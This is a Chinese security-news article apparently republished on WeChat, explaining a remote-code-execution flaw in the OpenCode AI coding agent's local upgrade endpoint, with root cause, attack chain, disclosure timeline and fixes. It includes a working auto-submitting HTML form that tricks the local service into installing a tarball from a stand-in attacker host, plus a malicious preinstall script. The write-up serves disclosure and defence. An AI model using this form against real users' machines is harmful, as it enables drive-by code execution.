---
title: OpenCode 升级端点 RCE：一个表单就能从网页打到本机（GHSA-632h-h47v-g4x4）
url: https://mp.weixin.qq.com/s/PolmGFtTvwXKkk8QRaqQ9Q
source: Doonsec's feed
date: 2026-09-26
fetch_date: 2026-09-27T07:21:04.362295
---

# OpenCode 升级端点 RCE：一个表单就能从网页打到本机（GHSA-632h-h47v-g4x4）

# OpenCode 升级端点 RCE：一个表单就能从网页打到本机（GHSA-632h-h47v-g4x4）

Ots安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

> 一句话速览：Datadog Security Labs 在 OpenCode（一款月活 1600 万的 AI 编程代理）的 /global/upgrade 端点发现一个远程代码执行漏洞。当用户通过 npm/pnpm/Bun 安装 OpenCode 并运行 opencode serve 或 opencode web 时，访问一个恶意网页即可触发升级流程，让 OpenCode 安装攻击者托管的 npm 包并执行 preinstall 脚本。该漏洞编号 GHSA-632h-h47v-g4x4，影响版本 1.14.30 – 1.18.21，已在 1.18.22 中修复。

## 一、真实性核查

| 核查项 | 结论 | 依据 |
| --- | --- | --- |
| 漏洞存在性 | ✅ 已确认 | Datadog Security Labs 2026-09-24 发布原始分析；GitHub Security Advisory GHSA-632h-h47v-g4x4 已公开 |
| 影响版本 | ✅ 已确认 | OpenCode 1.14.30 – 1.18.21（npm/pnpm/Bun 安装）；修复版本 1.18.22 |
| 利用条件 | ✅ 已确认 | 运行 `serve` / `web` 且无密码认证（或浏览器已缓存基本认证凭据） |
| 下载数据 | ✅ 已确认 | 公开 npm 数据：2026-09-17 至 09-23 期间，82 个漏洞版本下载量超 **647,000 次**，占该时段总下载量的 **38.9%** |
| 修复代码 | ✅ 已确认 | PR #44686 与 commit `c6e76e9b2865b03f1a7611db2dbd04eddc80c65e` 已合并 |
| CVE 状态 | ⚠️ 未申请 CVE | Anomaly 选择不申请 CVE，称 GitHub Security Advisories 已足够；请勿与 2026-01 的 **CVE-2026-22812** 混淆 |

## 二、背景：OpenCode 是什么，为什么这个漏洞值得关注

OpenCode 是由 **Anomaly** 团队开发的开源 AI 编程代理，定位与 Claude Code、Codex CLI 类似，允许开发者在终端或浏览器里用自然语言驱动编码任务。根据其官方数据，发布于 2025 年 6 月的 OpenCode 在 GitHub 上已获得 **超 20 万 stars**，月活用户约 **1600 万**。

为了方便 Web 端和自动化集成，OpenCode 提供了本地 HTTP 服务：

* `opencode serve`

  ：无头服务器模式
* `opencode web`

  ：带 Web UI 的服务器模式

默认监听 **`127.0.0.1:4096`**。这些本地端点的设计目标是让浏览器插件、编辑器扩展或其他进程调用 OpenCode 的能力——但一旦被滥用，就会成为**浏览器可达的本地攻击面**。

## 三、漏洞概述：升级端点如何变成 RCE 入口

### 3.1 受影响的范围

漏洞成立必须**同时满足**以下三个条件：

1. **版本**

   ：OpenCode **1.14.30 – 1.18.21（含）**
2. **安装方式**

   ：通过 **npm、pnpm 或 Bun** 安装（可运行 `ls -l "$(command -v opencode)"` 确认）
3. **运行与认证**

   ：正在运行 `opencode serve` 或 `opencode web`，且**未设置密码**，或浏览器已缓存基本认证凭据

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0EMOp0Ax7HNxPn16JDxaZGs9RBydowtxpxv4DO8SaYjRkI0n2QYjVAxxHt5rF8URk1l4muVk7U7ZEPNlBUU62evko1mbzbZDbM/640?wx_fmt=png&from=appmsg)

### 3.2 根因

漏洞代码路径由 PR #24853 于 2026 年 4 月 29 日引入，v1.14.30 成为最早的受影响版本。问题集中在 `/global/upgrade` 端点：

* 升级函数会执行：

```
npm install -g opencode-ai@<target>
```

* npm 允许将**远程 tarball URL** 作为安装目标；
* 服务端**未校验 `Content-Type`**，把 `text/plain` 表单提交误当 `application/json` 解析；
* `target`

  字段**未限制为语义版本**，任意字符串均可传入。

三者叠加，导致攻击者可以构造一个恶意网页，用 HTML 表单跨域 POST 到本地服务，让 OpenCode 去安装并执行攻击者控制的 npm 包。

---

## 四、技术原理：Content-Type 混淆与 npm tarball 滥用

### 4.1 关键端点代码

在 v1.18.21 中，升级逻辑大致如下（TypeScript）：

```
// packages/opencode/src/installation/index.tscase"npm":  upgradeResult = yield* run([    "npm", "install", "-g", `opencode-ai@${target}`  ]);
```

`target` 来自请求体，并被拼接到 `npm install -g opencode-ai@<target>` 命令中。npm 规范允许 `<target>` 是：

* 语义版本，例如 `1.18.1`
* dist-tag，例如 `latest`
* **远程 tarball URL**

  ，例如 `http://attacker.example/opencode-malicious.tgz`

因此，只要攻击者能控制 `target`，就能让 npm 下载并安装任意 tarball。

### 4.2 Content-Type 混淆：text/plain 如何拼出合法 JSON

这是整个利用链最精巧的部分。

HTML `<form>` 不支持 `enctype="application/json"`，但**支持 `enctype="text/plain"**。当表单字段名和值被特殊构造时，浏览器生成的请求体可以被服务端当作 JSON 解析成功。

攻击者构造如下表单：

```
<formmethod="POST"enctype="text/plain"action="http://127.0.0.1:4096/global/upgrade">  <input    type="hidden"    name='{"target":"http://attacker.example/opencode-malicious.tgz","x":"'    value='"}'  ></form><script>document.forms[0].submit()</script>
```

浏览器以 `text/plain` 提交时，会插入 `=` 号，得到：

```
{"target":"http://attacker.example/opencode-malicious.tgz","x":"="}
```

服务端使用 `parseBody()` 直接尝试 `JSON.parse()`，成功解析出目标对象，完全未检查 `Content-Type`。随后 `target` 被传入 `npm install`，触发恶意包安装。

### 4.3 为什么浏览器会放行跨域请求？

因为攻击者使用的是\*\*顶层导航（top-level navigation）\*\*的 HTML 表单 POST，而不是 `fetch`/`XMLHttpRequest`：

* CORS 预检不阻止顶层导航；
* Local Network Access（Chrome 142 / Firefox 151 / Edge 143）同样不阻止顶层导航；
* 表单自动提交后，浏览器会离开当前页面，向本地地址发出 POST。

换言之，同源策略在这里被绕过，并非协议实现错误，而是表单导航机制本身的特性被利用。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0FSawjr4iaDYrWlZEKrk3Pwwxr73nqfP1X9pZgQyL0yYdNqOd59s6sbgGUIMDqjL22Uvh1liaT9npv4kFwT8FpKpr1oDaG5h9evw/640?wx_fmt=png&from=appmsg)

## 五、攻击链路：五步从「点开网页」到「本机被执行」

| 步骤 | 动作 | 关键点 |
| --- | --- | --- |
| 1 | 受害者访问含隐藏表单的恶意网页 | 攻击面是「任意网页」 |
| 2 | 表单以 `enctype="text/plain"` 自动提交到 `127.0.0.1:4096/global/upgrade` | 顶层导航绕过 CORS / Local Network Access |
| 3 | OpenCode 服务端未校验 `Content-Type`，把 `text/plain` 当 JSON 解析 | 内容类型混淆 |
| 4 | `target` 字段被当作版本号传入 `npm install -g opencode-ai@<target>` | 输入注入 |
| 5 | npm 拉取攻击者托管的 tarball，执行 `preinstall` 脚本 | 远程代码执行 |

![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0FC1xtgMbKN0fRMhOk8gJiaXhTJvqN9N5ic0pUP4pIdubicG6ACpyo1vk5Czx08Ubjf4Rnicy6svOSNOl4R0HSavc7fQCkUfUNjmcc/640?wx_fmt=png&from=appmsg)

## 六、概念验证：公开 PoC 与防御视角

> ⚠️ **声明**：以下内容仅用于理解漏洞机制与防御。Datadog 与 Anomaly 已公开修复版本，请勿在未授权环境中使用相关代码。实际利用须遵守《网络安全法》等相关法律法规。

攻击者准备的恶意包 `package.json` 可能如下：

```
{  "name":"opencode-ai",  "version":"1.0.0",  "scripts":{    "preinstall":"open /System/Applications/Calculator.app && id > /tmp/opencode-rce"  }}
```

打包为 tarball 后，攻击者托管在公开 URL。恶意网页通过前述 `text/plain` 表单让受害者的 OpenCode 去安装该包，从而触发 `preinstall` 脚本。

从防御角度，这个 PoC 揭示了两个设计层面的问题：

1. **本地服务不应信任浏览器来源的请求体**

   ：任何绑定在 `127.0.0.1` 且执行特权操作的端点，都必须严格校验来源、内容类型与输入格式；
2. **安装目标必须白名单化**

   ：把用户可控的字符串直接拼进包管理器命令，等价于把命令注入通道暴露给网络。

## 七、影响评估：与 CVE-2026-22812 的区别

需要特别区分两个不同的 OpenCode 漏洞：

|  | GHSA-632h-h47v-g4x4（本文） | CVE-2026-22812（更早） |
| --- | --- | --- |
| 披露时间 | 2026-09-24 | 2026-01-13 |
| 影响版本 | 1.14.30 – 1.18.21 | < 1.0.216 |
| 漏洞入口 | `/global/upgrade` 端点 | 未认证 HTTP 服务器（`/session/:id/shell` 等） |
| 核心问题 | Content-Type 混淆 + npm tarball 滥用 | 缺失认证 + 宽松 CORS |
| CVE | 未申请 | CVE-2026-22812，CVSS 3.1 8.8 |
| 修复版本 | 1.18.22 | 1.0.216 |

两者说明同一个趋势：**AI 编程代理在本地暴露的 HTTP 服务，正在成为浏览器可达的高价值攻击面**。

---

## 八、披露与修复时间线

| 日期 | 事件 |
| --- | --- |
| 2026-04-29 | PR #24853 引入漏洞代码路径 |
| 2026-04-30 | OpenCode v1.14.30 发布，最早的漏洞版本 |
| 2026-08-11 | Datadog Security Labs 发现漏洞并通过 GitHub Security Advisories 报告 |
| 2026-08-24 | Anomaly 合并修复 PR #44686，发布 v1.18.22 |
| 2026-08-24 | 应 Anomaly 请求，Datadog 推迟公开披露一个月，给用户更多升级时间 |
| 2026-09-24 | Datadog 发布分析文章，Anomaly 发布 GHSA 公告 |

参考：

* https://securitylabs.datadoghq.com/articles/opencode-upgrade-remote-code-execution/

**END**

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0ETD8PzJC38QUHf56icWCCNNOMql20nXHyrhzwULXjjWibk5qj6Kxk1ZWnic66oIu0h0iaZOvia5GwH0c1veyVS2yvcpKtWODaUSlVw/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外等平台- 搜索的内容通过结合编写 -

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过